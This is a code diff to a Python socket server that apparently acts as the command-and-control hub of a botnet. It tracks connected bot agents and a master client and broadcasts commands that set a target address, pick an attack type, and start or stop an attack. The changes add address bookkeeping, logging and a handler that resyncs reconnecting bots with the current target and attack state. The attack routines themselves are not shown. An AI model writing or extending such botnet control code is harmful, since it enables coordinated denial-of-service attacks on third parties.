@@ -25,6 +25,7 @@ class Server():
         self.port = port
         self.sock: socket.socket = None
         self.socket_list: list[socket.socket] = []
+        self.socket_addr_list: dict[socket.socket, str] = {}
         self.bot_agents: dict[socket.socket, str] = {}
         self.master_client: socket.socket = None
         self.target_address: str = ''
@@ -66,8 +67,10 @@ class Server():
         return
 
     def _accept_wrapper(self, notified_sock: socket.socket) -> None:
+        new_sock_addr = str(notified_sock.getpeername())
         self.socket_list.append(notified_sock)
-        print(f'New client connected > {str(notified_sock.getpeername())}')
+        self.socket_addr_list[notified_sock] = new_sock_addr
+        print(f'New client connected > {new_sock_addr}')
 
         # Ask client to identify themselves
         notified_sock.send('whoami:_'.encode(ENCODING))
@@ -75,16 +78,18 @@ class Server():
         return
 
     def _request_router(self, sock: socket.socket) -> None:
-        sock_addr = sock.getpeername()
-        recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
-        print(f'received request from ${sock_addr}')
         try:
+            sock_addr = sock.getpeername()
+            recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
             if recv_data:
                 try:
                     req_type, req_body = recv_data.split(':')
+                    print(f'received {req_type} request from ${sock_addr}')
                     # iam request applies to both master and bot agent
                     if req_type == 'iam':
                         self._iam_handler(sock, req_body)
+                    elif req_type == 'getstate':
+                        self._send_state(sock)
                     elif sock in self.bot_agents:
                         self._bot_handler(sock, req_type, req_body)
                     elif sock == self.master_client:
@@ -151,6 +156,7 @@ class Server():
         elif type == 'changeattk':
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
+            print(f'Attack type is: {self.attk_type}')
             return
         elif type == 'startattk':
             if not self.target_address:
@@ -163,6 +169,7 @@ class Server():
                 self._bot_broadcast('startattk:True'.encode(ENCODING))
                 self.attacking = True
                 response = 'startattk:success:started attack'
+                print("starting attack")
         elif type == 'stopattk':
             if not self.target_address or not self.attacking or not self.attk_type:
                 response = 'stopattk:error:no attack in progress'
@@ -170,6 +177,7 @@ class Server():
                 self._bot_broadcast('stopattk:True'.encode(ENCODING))
                 self.attacking = False
                 response = 'stopattk:success:stopped attack'
+                print("stopping attack")
         else:
             response = f'{type}:error:unknown command'
 
@@ -185,9 +193,10 @@ class Server():
         return
 
     def _disconnect_wrapper(self, sock: socket.socket) -> None:
+        sock_addr = self.socket_addr_list[sock]
+
         self.socket_list.remove(sock)
-        sock_addr = sock.getpeername()
-        sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])
+        del self.socket_addr_list[sock]
 
         # bot agent disconnect
         if sock in self.bot_agents:
@@ -197,13 +206,13 @@ class Server():
                 bots = self._get_bot_list()
                 self.master_client.sendall(
                     f'listbot:{bots}'.encode(ENCODING))
-            print(f'bot agent {sock_addr_str} disconnected')
+            print(f'bot agent {sock_addr} disconnected')
         # master client disconnect
         elif self.master_client == sock:
             self.master_client = None
-            print(f'master client {sock_addr_str} disconnected')
+            print(f'master client {sock_addr} disconnected')
         else:
-            print(f'client {sock_addr_str} disconnected')
+            print(f'unauthorized client {sock_addr} disconnected')
 
         return
 
@@ -213,6 +222,12 @@ class Server():
             bots += self.bot_agents[bot] + ','
 
         return bots
+
+    def _send_state(self, sock: socket.socket) -> None:
+        sock.send(f'changeip:{self.target_address}'.encode(ENCODING))
+        sock.send(f'changeattk:{self.attk_type}'.encode(ENCODING))
+        sock.send(f'startattk:{self.attacking}'.encode(ENCODING))
+        return
 
 
 if __name__ == "__main__":
